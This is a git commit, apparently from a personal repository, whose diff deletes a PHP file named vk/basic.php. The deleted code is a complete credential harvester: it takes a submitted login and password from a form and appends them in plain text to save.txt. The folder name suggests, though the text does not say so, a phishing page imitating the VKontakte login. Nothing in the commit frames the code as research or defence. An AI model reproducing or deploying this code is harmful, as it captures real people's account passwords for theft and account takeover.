d9296acd2f078e1800812941f026907026f7ee2b
GimiOne <dim.zaikin2013@gmail.com>
2019-04-11 18:17:13 +0300

    del folder

--- vk/basic.php
+++
@@ -1,9 +0,0 @@
-<?php
-    $login = $_POST["login"];
-    $pass = $_POST["pass"];
-    $filed = "save.txt";
-    $result = "Login: $login | Password: $pass\r\n";
-	$rez = $result;
-	file_put_contents($filed, $rez, FILE_APPEND);
-?>
- 
